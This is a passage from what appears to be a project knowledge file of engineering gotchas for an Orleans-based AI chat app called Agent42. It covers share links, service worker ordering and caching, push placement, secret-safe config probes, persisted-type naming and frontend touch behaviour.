  `Program.cs`, so the guard is a source-text assertion that strips comment lines first (this file's own
  prose names the bad form) and checks the `.Clear()` calls, the ordering, and the absence of `= {`.
- **Evidence:** `src/Agent42.Backend/Program.cs` (`app.UseForwardedHeaders`, ahead of
  `UserTelemetryMiddleware` and `UseDefaultFiles`), `src/Agent42.Backend/Sharing/AgentApi.Sharing.cs`
  (`ShareUrl`), `src/Agent42.Backend/Mcp/AgentApi.Mcp.cs` (`redirect_uri`, persisted `ClientId`),
  `tests/Agent42.Tests/ProjectLayoutTests.cs` (`Program_TrustsForwardedProtoBeforeAnyOtherMiddleware`),
  `.agentic/decisions/0042-wildcard-easy-auth-exclusions-and-forwarded-proto.md`
- **Verified:** 2026-08-20

### A read-only share link stores the RAW token and revokes by deregistering the directory FIRST

- **Claim:** the share-link grains (ADR 0035) mirror the ADR 0022 key directory with **two deliberate
  inversions**. **(1)** `UserShareLinksGrain` persists the **raw** `shr_` token, not just its hash (contrast
  `AgentDefinition.ApiKeyHash`): the owner re-displays and copies the link repeatedly, and it is a
  low-sensitivity, single-conversation, read-only capability — so there is no once-shown secret to protect.
  **(2)** Revoke **deregisters the global `ShareLinkDirectoryGrain` FIRST**, then drops the list entry — the
  *opposite* order to an agent-key delete. An agent-key delete removes the registry entry first because the
  run endpoint re-checks the agent exists and 401s on a mid-failure orphan; **unsharing does not delete the
  conversation**, so there is no such backstop — deregistering first makes a crash leave the link **dead**,
  never a live revoked link. Deleting a conversation also revokes its link (belt-and-braces). `ShareToken`
  is the one place that generates *and* hashes (like `ApiKey`).
- **Evidence:** `src/Agent42.Agents/Sharing/UserShareLinksGrain.cs` (raw token stored; `RemoveAsync` deregisters
  before dropping the entry), `src/Agent42.Agents/Sharing/ShareToken.cs`, `src/Agent42.Agents/StoredAgents/AgentRegistryGrain.cs`
  (the opposite delete order, for contrast),
  `tests/Agent42.Tests/ShareLinkGrainTests.cs` (`UserGrain_Revoke_DeregistersTheDirectory_SoTheLinkGoesDead`),
  `.agentic/decisions/0035-read-only-share-links.md`
- **Verified:** 2026-07-30

### The background (agent-run) run must drain `ChatCoreAsync`, not the reminder path, or attachments vanish

- **Claim:** the async run behind `POST /api/agent-run` (ADR 0022, `IAgentGrain.EnqueuePromptAsync`, `[OneWay]`)
  runs its turn by **draining `ChatCoreAsync`** (`await foreach` over it, discarding the streamed events after
  clearing `_turnLocation` like the reminder path). This is deliberate and load-bearing: `ChatCoreAsync` is
  the *only* place that does the no-model guard, the **image-generation branch** (ADR 0020), the **vision
  gate + attachment→`UriContent` materialization** (ADR 0013/0004) and document retrieval. The reminder path
  (`ReceiveReminder`) pushes an **always-empty** attachment list and does none of that — so reusing *it* (the
  spec's original plan) would make agent-run images **silently vanish** and an image-generation agent never
  edit its input. Do not "simplify" `EnqueuePromptAsync` to a bare `_agent.RunAsync([msg], _session)`.
  Because it's `[OneWay]`, callers/tests can't await the turn — **poll** history for the persisted result.
- **Evidence:** `src/Agent42.Agents/Conversations/AgentGrain.cs` (`EnqueuePromptAsync` draining `ChatCoreAsync`; contrast
  `ReceiveReminder`'s empty-attachment turn), `tests/Agent42.Tests/AgentGrainTests.cs`
  (`EnqueuePrompt_RunsAndPersistsTurn`, `EnqueuePrompt_WithImage_RecordsAttachmentOnTurn` — both poll),
  `.agentic/decisions/0022-per-agent-api-key-and-async-run-endpoint.md`
- **Verified:** 2026-07-17

### The Web Share Target `respondWith` must sit after the `/api` guard, and the share needs an active SW

- **Claim:** the Web Share Target (ADR 0023) is handled entirely in `sw.js`: `POST /share` is intercepted
  client-side, stashed in IndexedDB, and answered with a 303 to `/?share=1` — so the body never reaches
  the network (a POST navigation to a protected path would 302 to the Easy Auth login and **lose the
  body**, ADR 0002). Two traps invisible in the code: **(1) placement** — the share branch introduces the
  *first* `event.respondWith` in the fetch handler, so it MUST sit **after** the `url.pathname.startsWith("/api")`
  early-return (the ADR 0002 never-intercept-`/api` invariant, pinned by `ServiceWorker_BypassesApiBeforeCaching`
  and `ServiceWorker_HandlesShareTarget` which both assert `startsWith("/api")` precedes the first
  `respondWith`) and **after** the same-origin guard (else a cross-origin `POST /share` is handled), but
  **before** the `if (req.method !== "GET") return;` line (a share is a POST, so that early-return moved
  *below* the share branch). Putting the share `respondWith` above the `/api` guard silently breaks the
  auth invariant *and* the test. **(2) the SW must be active and controlling** for any of this to fire
  (true after install on Android). If it isn't, `POST /share` reaches the server, which has no `/share`
  route, and the share fails ungracefully. This is **accepted** platform degradation — do NOT add a server
  `POST /share` fallback: it reintroduces the Easy Auth body-loss problem the SW-stash exists to avoid.
  Web Share *Target* is Android/Chromium-only regardless (iOS PWAs can't register as targets).
- **Evidence:** `src/Agent42.Backend/wwwroot/sw.js` (`handleShare`, the ordered fetch handler),
  `src/Agent42.Backend/wwwroot/manifest.webmanifest` (`share_target`),
  `tests/Agent42.Tests/PwaAssetsTests.cs` (`ServiceWorker_HandlesShareTarget`, `Manifest_DeclaresShareTarget`),
  `.agentic/decisions/0023-web-share-target-android-pwa.md`, `.agentic/decisions/0002-entra-easy-auth-gate.md`
- **Verified:** 2026-07-18

### The away-reply push belongs in the two async callers, never in `ChatCoreAsync`

- **Claim:** the Web Push notification when an agent replies (ADR 0028) must be sent from the two
  **async** callers — `EnqueuePromptAsync` (agent-run) and `ReceiveReminder` (scheduled prompt) — and
  **never** from `ChatCoreAsync`, which all three paths share. `ChatCoreAsync` is the live interactive
  path's body too, so a send there would notify a user who is actively watching their reply stream — the
  exact opposite of "away". "Not online" is approximated by this placement alone; there is no
  presence/heartbeat tracker (rejected, ADR 0028). Two further placement traps invisible in the code:
  **(1)** in `EnqueuePromptAsync` the send sits **inside the `try`, after the drain loop** (a faulted turn
  caught below must not notify) and is **gated on `!string.IsNullOrEmpty(_modelId)`** — the no-model path
  drains ChatCoreAsync *normally* (it emits the "configure a provider" notice + `Done`), so an ungated
  send would fire a false "your agent replied"; `_modelId` is set by ChatCoreAsync's re-resolve/rebind if
  a provider appeared mid-flight. **(2)** in `ReceiveReminder` the send is **after `WriteStateAsync`** (so
  a push only ever follows a durably-persisted reply) and needs **no** `_modelId` guard — the no-model
  reminder already early-returned above. Separately, the send is a safe inline `await` on the
  **non-reentrant** grain only because the sender is internally time-bounded (`SendBudget`) and its
  `HttpClient` calls `RemoveAllResilienceHandlers()` (the same named-client retry trap as the web/geocoding
  clients) — see the "web tool return value" / geocoder gotchas.
- **Evidence:** `src/Agent42.Agents/Push/AgentGrain.Push.cs` (`SendAwayReplyPushAsync` itself — but
  note the three facts this gotcha is about are all CALL SITES, which live in the core part:
  `src/Agent42.Agents/Conversations/AgentGrain.cs` has the gated call in `EnqueuePromptAsync`, the
  post-`WriteStateAsync` call in `ReceiveReminder`, and the deliberate ABSENCE of any call from
  `ChatCoreAsync`), `src/Agent42.Backend/Push/WebPushNotificationSender.cs` (`SendBudget`),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`ReceiveReminder_SendsPush_WithAgentName`,
  `EnqueuePrompt_SendsPush`, `ChatAsync_DoesNotSendPush`, `EnqueuePrompt_NoModel_DoesNotSendPush`),
  `.agentic/decisions/0028-web-push-when-agent-replies-while-away.md`
- **Verified:** 2026-07-21

### Config-health: the PROBE path is the leak channel, not the static one — and don't inject `IHttpClientFactory`

- **Claim:** `GET /api/config-health` (ADR 0029) must never surface a secret, and the danger is the **live
  probe** path, not the static presence check. The static builder (`ConfigHealth.BuildStatic`) only ever
  emits fixed literal messages, so it is safe by construction. The trap is a probe: the Google geocoding
  key **rides in the request query string** (`GoogleGeocoder`, `&key=…`), so a probe that put `ex.Message`/
  `ex.ToString()` or the target URL into a `ConfigCheck.Message` would leak the key. Rule: `ProbeAsync`
  wraps every probe in a `catch` that **discards the exception** and emits a curated constant
  (`"unreachable"`), and each probe classifies a non-2xx by **status/marker**, never by echoing the
  response body. Anyone adding a probe returns a curated `ProbeResult`, never text derived from `ex`/a
  body/a URL. Three more traps in the same feature: **(1)** the endpoint injects **`IServiceProvider`,
  deliberately NOT `IHttpClientFactory`** — the factory is unregistered in DevHost (no `AddServiceDefaults`),
  and a minimal-API param the host can't resolve is treated as a body, breaking routing for the **whole**
  host (the same trap the DevHost `PushConfig` registration guards); probe deps resolve optionally via
  `sp.GetService<T>()` inside `ProbeAsync`, so the feature adds **no** new mandatory both-hosts
  registration. **(2)** the geocoding probe is built **only when its key is present** — `CreateClient(
  "google-geocoding")` with no key returns a client that **inherits** `AddServiceDefaults`' retry pipeline
  (the conditional-registration named-client trap); embeddings have no named client (they use
  `IEmbeddingGenerator`). **(3)** a SearXNG **403 is a HEALTHY sidecar** (JSON API off), not an auth
  failure. A test-only `ConfigHealthProbeSet` (which `ProbeAsync` prefers over its `FromServices` factory)
  is the seam that proves a static call runs **zero** probes.
- **Evidence:** `src/Agent42.Backend/Configuration/ConfigHealth.cs` (`ProbeAsync`'s catch; `ConfigHealthProbeSet.
  FromServices` — geocoding-only-when-keyed, `ProbeSearxngAsync` 403→ok, no body in any message),
  `src/Agent42.Backend/Configuration/AgentApi.Configuration.cs` (the `GET /api/config-health` endpoint — `IServiceProvider`, not
  `IHttpClientFactory`), `tests/Agent42.Tests/ConfigHealthTests.cs` (`FailingProbe_NeverLeaksSecret`,
  `Report_NeverContainsSecretValues`), `tests/Agent42.Tests/ConfigHealthProbeTests.cs`
  (`GeocodingProbe_ClassifiesBody`, `SearxngProbe_ClassifiesStatus`, `GeocodingProbe_NullWhenKeyAbsent`),
  `tests/Agent42.Tests/ConfigHealthApiTests.cs` (`Static_RunsNoProbes`),
  `.agentic/decisions/0029-config-health-tab.md`
- **Verified:** 2026-07-21

### Cosmos grain storage is JSON with `$type` — a persisted type's NAMESPACE is part of the on-disk format

- **Claim:** `AddCosmosGrainStorage` (`src/Agent42.Backend/Program.cs`) configures no serializer, so it
  falls through to Orleans' default `IGrainStorageSerializer`, which is
  **`Orleans.Storage.JsonGrainStorageSerializer`** — Newtonsoft JSON with type discriminators. Every
  document in the `agent-state` container therefore begins:
  `{"$id":"1","$type":"Agent42.Agents.AgentGrainState, Agent42.Agents",...}`, and nested values
  (`ReminderInfo`, `AttachmentRef`, every `Dictionary`/`List`) carry their own `$type` too.
  **Renaming or re-namespacing any persisted type breaks every existing document.** It throws on the
  ROOT type — `JsonSerializationException: Error resolving type specified in JSON` — so the read fails
  whole; there is no partial recovery, and it would take out every conversation, stored agent, user
  profile, provider config, MCP server, push subscription, share link and usage rollup at once.
- **This nearly shipped.** ADR 0039 moved the 73 flat files of `Agent42.Agents` into feature folders and
  gave each a folder-matching namespace. It passed the full suite, `dotnet format`, and an adversarial
  review, because the serialization test in the branch used a hand-built `Serializer<T>` — Orleans'
  **binary** serializer, the one that carries grain-to-grain calls. Cosmos does not use it. The move was
  reported as "measured inert" on the strength of a test that could not see the failure. The namespaces
  were reverted to flat and only the folders kept.
- **Consequences to hold on to:** (1) `src/Agent42.Agents` is organised into folders whose namespaces
  deliberately do NOT match — `.editorconfig` turns IDE0130 off so the IDE stops suggesting the change,
  and `ProjectLayoutTests.EveryFileStaysInTheFlatNamespace` catches it if made by hand. (2) `[Alias]`
  is a **different** mechanism governing the binary path; it is not what protects data at rest, so a
  green `SerializationCompatibilityTests` says nothing here. (3) If you ever do need to move one, the
  options are a Newtonsoft `SerializationBinder` mapping old names to new, or a migration pass
  rewriting `$type` in every document — both were considered and declined as not worth it for tidiness.
- **Evidence:** `tests/Agent42.Tests/GrainStorageSerializerTests.cs`
  (`GrainState_IsPersistedAsJson_WithAssemblyQualifiedTypeNames` pins the format;
  `DocumentWrittenByAnEarlierDeployment_StillDeserializes` reads a real committed pre-move payload;
  `PersistedTypeName_StillResolves` pins all 12 state-root type names as literals),
  `src/Agent42.Agents/Conversations/AgentGrainState.cs` (the comment at the type),
  `.editorconfig`, `.agentic/decisions/0039-feature-folders-in-agents-project.md`
- **Verified:** 2026-08-18

### `[Alias("Agent42.Agents.*")]` governs the BINARY path, not what Cosmos stores

- **Claim:** every serializable and grain-interface type carries an explicit literal
  `[Alias("Agent42.Agents.X")]` (54 of them). These name types for **Orleans' binary serializer** — the
  one used for grain-to-grain calls and `Serializer<T>` — and should stay stable so a rolling deployment
  with mixed versions keeps interoperating. Keep them frozen.
- **But do not mistake them for the data-at-rest guard.** Mutation testing showed the golden blobs in
  `SerializationCompatibilityTests` do **not** fail when an `[Alias]` string changes, nor when a type's
  namespace changes; only an `[Id(n)]` renumber is caught. What actually protects stored state is the
  JSON `$type` discriminator — see the entry above. Reasoning about persistence from the alias is what
  produced a nearly-shipped data-loss bug in ADR 0039.
- **Evidence:** `tests/Agent42.Tests/SerializationCompatibilityTests.cs` (the recorded mutation results
  in its class doc), `src/Agent42.Agents/Conversations/AgentGrainState.cs`,
  `.agentic/decisions/0039-feature-folders-in-agents-project.md`
- **Verified:** 2026-08-18

### The service worker's SHELL is all-or-nothing — a STALE entry is worse than a missing one

- **Claim:** `sw.js` installs with `caches.open(CACHE).then((c) => c.addAll(SHELL))`, and `addAll`
  **rejects the whole promise if any single entry is non-2xx**. Since ADR 0041 split `app.js` into
  ~28 modules, SHELL went from 10 entries to 37, so both directions are now live hazards and both are
  **invisible online**:
  - **Missing entry** (a new module not added) → that module isn't cached → the installed PWA breaks
    **offline only**. ADR 0032's IndexedDB mirror makes it worse, not better: it happily paints cached
    conversations into a shell whose JS failed to load.
  - **Stale entry** (a renamed/deleted module still listed) → `addAll` rejects → the `install`
    `waitUntil` fails and **the service worker never activates at all**. That takes down the offline
    read cache (ADR 0032), the Web Share Target (ADR 0023 — `POST /share` then reaches a server that
    has no such route) and Web Push (ADR 0028 — no registration to subscribe against).
- So the guard is **bidirectional**: the `/js/*` entries of SHELL must **equal** the directory
  contents, not merely contain them.
- **Evidence:** `src/Agent42.Backend/wwwroot/sw.js` (`SHELL`, `addAll`),
  `tests/Agent42.Tests/ProjectLayoutTests.cs` (`ServiceWorkerShell_ListsExactlyTheModuleDirectory`),
  `.agentic/decisions/0041-frontend-es-modules.md`
- **Verified:** 2026-08-19

### Every MR that touches `wwwroot/js/` must bump `CACHE` in sw.js — module version skew is a BLANK app

- **Claim:** `sw.js` serves subresources **cache-first** (stale-while-revalidate) while navigations are
  network-first. With one `app.js` a stale serve was self-consistent — you got yesterday's app, whole.
  Across a ~28-module graph it is not: the window between a fresh `index.html` and the new service
  worker activating can serve a **version-skewed mixture** of old and new modules, and a cross-module
  export rename then throws `SyntaxError: The requested module './x.js' does not provide an export
  named 'y'`. That is a **blank app**, not a degraded one — module evaluation aborts, so nothing wires.
- Bumping `CACHE` is **necessary but not sufficient** (it does not close the window); it is what makes
  the skew transient rather than sticky. `PwaAssetsTests.ServiceWorker_CacheNameIsCurrent` pins the
  current value, so the bump cannot be forgotten silently — but the test only tells you it changed, it
  cannot tell you the graph is consistent. This used to be a forgiving convention; it no longer is.
- **Evidence:** `src/Agent42.Backend/wwwroot/sw.js` (`CACHE`, the stale-while-revalidate branch),
  `tests/Agent42.Tests/PwaAssetsTests.cs` (`ServiceWorker_CacheNameIsCurrent`),
  `.agentic/decisions/0041-frontend-es-modules.md`
- **Verified:** 2026-08-19

### A frontend module unreachable from `main.js` is invisible to every source-text guard

- **Claim:** the `*AssetsTests` classes no longer read one file. They call
  `StaticAssetsServerFixture.GetAppScriptAsync()`, which starts at the served `main.js`, extracts relative
  specifiers, fetches them **over HTTP** transitively with a visited-set, and concatenates the result.
  Two consequences that are easy to get wrong:
  - A new module only enters that corpus **once something imports it** (transitively from `main.js`).
    Adding a module and asserting on its text without wiring it in gives you an assertion that passes
    against code the browser never loads — which is why `ProjectLayoutTests` separately fails on any
    orphan under `wwwroot/js/`, and why `main.js` must call each feature's `wire*()`/`init*()`.
  - The specifier regex must handle **all four forms** — `import … from "./x.js"`, `import "./x.js"`,
    `export … from "./x.js"`, `export * from "./x.js"`. Miss the side-effect form and a module drops
    out of the corpus *and* is reported as an orphan.
- Fetching over **HTTP rather than off disk** is deliberate: it keeps the original meaning of these
  assertions, which is that the code is actually **served**, not merely present in the repo.
- Related: assertions that slice a function body must count brace depth
  (`StaticAssetsServerFixture.Body`), never scan for a fixed indent like `"\n  }"` — at module scope
  bodies close at column 0, so an indentation-sensitive scan runs straight past the end.
- **The blind spot is wider than orphans, and `wwwroot/logs/` is the live example.** A standalone page
  outside `wwwroot/js/` is invisible to **both** guards at once: `GetAppScriptAsync()` never reaches it
  (nothing under `main.js` imports it) *and* `ProjectLayoutTests`' orphan check is scoped to
  `wwwroot/js`, so it is not reported either. `wwwroot/logs/` (ADR 0054) and `wwwroot/shared/` (ADR 0035)
  are both in that position by design — each is a self-contained classic script — so **each needs its own
  asset test that fetches its files from the fixture's `Client` directly**
  (`LogsConsoleAssetsTests`, `ShareLinkAssetsTests`), and such a test must **never** call
  `GetAppScriptAsync()`, which would silently assert against a corpus that does not contain the page.
  The same scoping is why adding files under `wwwroot/logs/` does not affect
  `ServiceWorkerShell_ListsExactlyTheModuleDirectory` (it compares only the `"/js/..."` entries) and why
  no `sw.js` `CACHE` bump was due for ADR 0054.
- **Evidence:** `tests/Agent42.Tests/StaticAssetsServerFixture.cs` (`GetAppScriptAsync`, `Body`),
  `tests/Agent42.Tests/LogsConsoleAssetsTests.cs`,
  `tests/Agent42.Tests/ProjectLayoutTests.cs`
  (`EveryFrontEndModule_IsReachableFromTheEntryPoint`,
  `FrontEndModule_ExportsItsEntryPoint_AndIsCalledFromTheCompositionRoot`),
  `.agentic/decisions/0041-frontend-es-modules.md`, `.agentic/decisions/0054-live-otel-console.md`
- **Verified:** 2026-08-27

### Topbar share availability: `startAgentChat` is a FOURTH transition and is the one that gets missed

- **Claim:** **four sites change the active conversation, not three.** `#topbarShareBtn` is enabled iff the active
  chat is persisted **and** has history, driven from `startNewConversation`, `selectConversation`,
  `send()`'s success path — and **`startAgentChat`**, which is the one that gets missed because it does
  **not** delegate to `startNewConversation`: it calls `setActiveId(convId)` itself. Without an explicit
  `setTopbarShare(null)` there, opening conversation A and then clicking an agent leaves the button
  **enabled and still pointing at A**, so Create mints a public, no-login link to a chat the user is not
  looking at — ADR 0035's consent property, broken. The analogy to `setIncognito` does **not** carry:
  `lockPicker` *hides* incognito, whereas share is *disabled, not hidden*, so a stale target stays visible
  and clickable. Place the clear **after** the continuous-agent early return (ADR 0016), which delegates to
  `selectConversation` and enables correctly on its own. Related: the `send()` enable belongs at the **end
  of the `try`**, never beside the `incognitoBtn.disabled = true` lock at the top of `send()` — that line
  runs *before* the fetch, so an offline send, a failed turn or a voice barge-in `AbortError` (ADR 0037)
  would light the button up on a chat that persisted nothing. Failure leaving it disabled is the
  conservative direction and self-heals via the sidebar. The two CSS traps that ride along — never give
  `.topbar` a `z-index` (it is unpositioned *so that* `#usageView`'s overlay still covers it), and
  `.topbar__brand`/`.topbar__menu` are mobile-only by default because the desktop sidebar header already
  draws the same wordmark — are carried by the comment on the `.topbar` rule itself, where anyone editing
  it will be looking.
- **Evidence:** `src/Agent42.Backend/wwwroot/js/agents.js` (`startAgentChat`, the clear after the
  continuous early return), `src/Agent42.Backend/wwwroot/js/conversations.js`
  (`startNewConversation`, `selectConversation`), `src/Agent42.Backend/wwwroot/js/send.js` (the enable at
  the end of the `try`), `src/Agent42.Backend/wwwroot/js/sharelinks.js` (`setTopbarShare`, the
  `openShareLink` null guard), `src/Agent42.Backend/wwwroot/styles.css` (`.topbar`, `.topbar__brand`,
  `.topbar__menu`, `body.is-incognito .topbar`), `tests/Agent42.Tests/TopbarActionsAssetsTests.cs`
  (`TopbarShare_IsClearedWhenAnAgentChatStarts`, `TopbarShare_IsGatedOnEmptyAndEphemeralChats`,
  `TopbarBrandAndMenu_AreMobileOnly`), `.agentic/decisions/0044-persistent-topbar-action-cluster.md`
- **Verified:** 2026-08-21

### A pinned agent chat must be HOISTED out of its group, never sorted into it — and hoisting costs the agent label

- **Claim:** `renderSidebar` does **one walk** over the server-ordered list and reserves a per-agent
  group's slot at its **first-encountered (= most recent) member**, filling it through a placeholder
  `<li>` replaced afterwards. So pinning implemented as *server-side re-sorting alone* drags **that
  agent's entire group** to the top the moment one of its chats is pinned — the group's slot follows its
  most-recent member. The render must therefore be **two passes**: a flat pinned block first
  (`buildConvRow(conv, true)`), then the existing grouping walk over the **unpinned remainder only**
  (`if (conv.pinned) continue;`, or the row renders twice). The server still owns the ordering
  (`OrderByDescending(c => c.Pinned).ThenByDescending(c => c.UpdatedAt)`) — do **not** re-sort in JS.
  Two things ride along and are easy to get wrong. First, **hoisting discards the agent's name**: only
  `.conv-group__name` renders it, so a hoisted agent chat needs a badge or it reads as a regular chat —
  and that badge must key on **`agentId` with a `|| "Agent"` fallback**, exactly as the grouping walk and
  `buildAgentGroup` do. Keying it on `agentName` looks equivalent and is not: a blank-named agent chat
  then groups correctly but hoists with **no label at all**, which is the very bug the badge exists to
  prevent. Second, **a fully-pinned agent group disappears by design** — the walk sees
  zero members and constructs nothing — which for a **continuous** agent (ADR 0016: exactly one
  conversation) is the *normal* case, not an edge case; it is safe only because of the badge, so do not
  "fix" it with an empty-group placeholder. Related, in the same family: the row actions are
  `opacity: 0` hover-reveals, so `.conv__pin` needs the `@media (hover: none)` block or pinning is
  impossible on the installed Android PWA while **un**pinning still works (`.conv-row.is-pinned
  .conv__pin` keeps that one visible) — **ADR 0052 replaced that block's permanent reveal with a
  long-press; see the separate entry below, and note `.conv-row.is-pinned .conv__pin` is the one rule it
  deliberately left alone.** That block covered the three *conversation-row* actions only;
  `.agent__action` and `.msg__copy` share the idiom and stay touch-unreachable (a recorded residual).
  The divider between the two blocks is likewise a trap: mark the last pinned row from JS
  (`.is-pinned-last`, set only when something follows it) rather than reaching for `:has()` — the
  selector cannot see past the block, so an all-pinned list draws a trailing rule under nothing — and
  style it with **`margin-bottom`, never `padding-bottom`**, because `.conv-row` is the containing block
  for the three absolutely-positioned actions, whose `top: 50%` resolves against its **padding** box.
  Finally, note what the guards can and cannot prove: every
  assertion here is source-text, so "renders exactly once" is **not** covered by any test — it was
  verified manually and the measurements are in the ADR.
- **Evidence:** `src/Agent42.Backend/wwwroot/js/sidebar.js` (`renderSidebar`'s two passes,
  `buildConvRow(conv, hoisted)`, `setPinned`),
  `src/Agent42.Agents/Conversations/ConversationIndexGrain.cs` (`GetConversationsAsync`, `SetPinnedAsync`),
  `src/Agent42.Backend/wwwroot/styles.css` (`.conv__pin`, `.conv-row.is-pinned .conv__pin`,
  `@media (hover: none)`, `.conv__agent`),
  `tests/Agent42.Tests/PinChatAssetsTests.cs`
  (`RenderSidebar_EmitsThePinnedBlockBeforeTheGroupingWalk`, `HoistedRow_CarriesTheAgentBadge`,
  `PinnedState_IsVisibleWithoutHover_AndReachableOnTouch`),
  `.agentic/decisions/0045-pinned-conversations.md`
- **Verified:** 2026-08-21

### Hiding a hover-reveal on touch: `:hover` still fires there, and `opacity: 0` still gets tapped
- **Area:** frontend — sidebar row actions, touch behaviour
- **Trap:** ADR 0052 replaced ADR 0045's permanent touch reveal with a 400 ms press-and-hold that marks
  one row `.is-revealed`. Two things make that harder than it looks, and both were caught in review
  rather than in production. First, **`(hover: none)` UAs still match `:hover`.** The three
  `.conv-row:hover .conv__*` reveals were unconditional, and Android Chrome applies `:hover` on tap and
  on press-and-hold and *keeps it* until the user taps elsewhere — so deleting the always-on rule inside
  `@media (hover: none)` fixes nothing on its own: a plain tap would still light every icon, and the
  timer would be invisible because the row is already hovered. Those three rules must therefore live
  inside **`@media (hover: hover)`**, split from their `:focus-visible` partners, which stay **ungated**
  so keyboard reveal survives everywhere. Second, **`opacity: 0` removes the paint, not the hit-test.**
  The three actions are `position: absolute` siblings appended *after* the row button, overlaying the
  82 px strip `.conv`'s `padding-right` reserves — ADR 0045's own manual pass proved a pure
  `Input.dispatchTouchEvent` tap on that strip fires them. Hidden-but-live means a thumb on the right
  edge of any row raises `deleteConversation`'s `confirm()` from a control nobody can see, so the
  unrevealed state needs **`pointer-events: none`** — with `.conv-row.is-pinned .conv__pin` exempted back
  to `auto`, since it is *visible* and would otherwise look pressable and not be. Three smaller ones in
  the same family: **never add `touch-action` to `.conv-row`** (it would stop the conversation list
  scrolling — cancel the press from JS instead); **`pointercancel` must cancel only a *pending* timer**,
  because Android fires it for its own long-press at ~500 ms, a good 100 ms *after* our 400 ms reveal, so
  treating it as "dismiss" makes the reveal flash and die on the one platform this exists for; and the
  click-suppression listener belongs on **the row button, not the `<li>`** — the three actions are the
  `<li>`'s children, so an `<li>` capture listener eats their clicks too, and their own
  `stopPropagation` runs later in the bubble phase and cannot save them. As with ADR 0045, every
  assertion here is source-text; the behaviour itself is the manual pass recorded in ADR 0052.
- **Evidence:** `src/Agent42.Backend/wwwroot/js/sidebar.js` (`wireRowReveal`, `clearReveal`,
  `LONG_PRESS_MS`, `renderSidebar`'s `clearReveal()`),
  `src/Agent42.Backend/wwwroot/styles.css` (`@media (hover: hover)`, `@media (hover: none)`),
  `tests/Agent42.Tests/RowActionsRevealAssetsTests.cs`,
  `.agentic/decisions/0052-long-press-reveals-row-actions.md`
- **Verified:** 2026-08-25

### A chat turn outlives its client — and "Transmission failed" after an app switch is a lie

- **Claim:** Two halves of one mechanism, neither visible in the code that depends on it.
  **Server:** Kestrel **discards** writes to an aborted connection rather than faulting them — measured
  with a real loopback RST mid-reply, `Response.WriteAsync` threw nothing at all — so the chat endpoint's
  `await foreach` keeps draining after the browser is gone, the turn completes and `AgentGrain` writes its
  session. Nothing in `AgentApi.Conversations.cs` *asks* for this, which is what makes it easy to delete:
  wiring `HttpContext.RequestAborted` into the turn (to stop an abandoned turn burning tokens) looks like
  an improvement and would silently break recovery, because the grain persists only **after** the last
  event — a cancelled turn is a *lost* turn, not a shortened one. `ChatStreamDisconnectTests` is the only
  thing that notices, and it needs **real Kestrel + a raw socket**: TestServer's in-memory pipe leaves the
  server unaware of a cancelled client, so the same test written against the shared TestServer host is
  vacuous (measured — it passes against a deliberately broken endpoint).
  **Client:** because of that, a failed stream on the installed PWA usually means the reply *succeeded*.
  Android freezes a backgrounded app and the socket dies with it, so `reader.read()` rejects (a
  `TypeError`, not an `AbortError`) the moment the user returns — which is why a refresh shows the answer.
  `send()` therefore re-reads the history and adopts the persisted reply before considering the error.
  Two traps inside that: the backgrounded flag **must be latched by a `visibilitychange` listener**
  (a frozen PWA runs no JS, so the rejection is only observed once the app is visible again and
  `document.hidden` read in the `catch` always says "no"), and the `priorTurns` yardstick must be
  snapshotted **before** the turn appends its own two bubbles or it counts them and never matches.
- **Evidence:** `src/Agent42.Backend/Conversations/AgentApi.Conversations.cs` (the `await foreach` that
  writes the NDJSON stream), `src/Agent42.Agents/Conversations/AgentGrain.cs` (`WriteStateAsync` after the
  stream), `src/Agent42.Backend/wwwroot/js/send.js` (`recoverPersistedReply`, `priorTurns`,
  `onVisibilityChange`), `tests/Agent42.Tests/ChatStreamDisconnectTests.cs`,
  `tests/Agent42.Tests/StreamRecoveryAssetsTests.cs`,
  `.agentic/decisions/0046-recover-a-reply-whose-stream-died.md`
- **Verified:** 2026-08-22

### `navigator.share` — render the link first, and it is NOT an Android test

- **Claim:** Three traps in one small call site, none of them visible in the code.
  **(1) Render before you share.** Transient user activation is a **Window-scoped time window**
  (~5 s in Chromium), not a token the `fetch` consumes — `share()` itself consumes it. So the hazard in
  "mint, then open the sheet on the same press" is the window **expiring** across the `await` on the
  POST, and the engine that breaks the gesture *deterministically* across an intervening `await` is
  **WebKit** (its same-task requirement), not Chrome. Do not describe this as "the fetch spends the
  activation" — that is the wrong mechanism and leads to the wrong fix. `createShareLink` therefore
  calls `renderShareLinkState(url)` **before** `nativeShareLink()`, so a sheet that never opens costs
  the user nothing.
  **(2) `typeof navigator.share === "function"` is not a phone test.** Desktop Chrome and Edge on
  Windows, Safari on macOS/iOS and Firefox on Android all satisfy it, so the **Copy** button is absent
  there too. That is deliberate (ADR 0047 chose the pure capability check over `(hover: none)` and over
  a UA sniff) — do not "fix" the missing Copy button with a media query. `#shareLinkUrl` stays a
  selectable readonly input, and that is the desktop fallback.
  **(3) The rejection swallow covers TWO causes and must stay silent.** `AbortError` is the user
  dismissing the sheet; `NotAllowedError` is no transient activation at call time. Neither is an error
  worth surfacing — the link is already in the dialog — so the `catch` shows nothing at all.
- **Evidence:** `src/Agent42.Backend/wwwroot/js/sharelinks.js` (`canNativeShare`, `nativeShareLink`,
  `createShareLink`), `tests/Agent42.Tests/ShareLinkAssetsTests.cs`
  (`NativeShare_IsGatedOnAPureFeatureDetect`, `NativeShare_RendersTheLinkBeforeOpeningTheSheet`),
  `.agentic/decisions/0047-native-share-for-read-only-links.md`
- **Verified:** 2026-08-22

### Uploaded skills: the framework's own limits are NOT what they look like, and two of them are security controls

- **Claim:** ADR 0049 lets a user upload a skill (`SKILL.md` or a zip). Four properties of
  `Microsoft.Agents.AI@1.13.0` shape `SkillPackage`, none of them guessable from the API surface, and all
  four **measured** (a throwaway `dotnet run app.cs`, 2026-08-25) rather than reasoned about.
  **(1) Resource/script classification is by EXTENSION at any folder — folder names are IRRELEVANT.**
  Resources are `.md .json .yaml .yml .csv .xml .txt`; scripts are `.py .js .sh .ps1 .cs .csx`; anything
  else is dropped by the parser. Measured: a `.py` file under a skill's `references/` folder is a **SCRIPT** and an `.md` file under an
  arbitrary `docs/` folder is a **RESOURCE** — the `scripts/`, `references/` and `assets/` literals in the assembly mean nothing to the
  classifier. So a script filter keyed on the `scripts/` **folder** lets a `.py` under `references/`
  straight through, and that filter is a security control. Belt and braces: the provider is also built
  with `AgentFileSkillsSourceOptions { AllowedScriptExtensions = [] }`, which makes the framework itself
  refuse to discover a script even if one reached disk.
  **(2) The skill-directory search is hard-capped at depth 2 and `SearchDepth` does NOT raise it.**
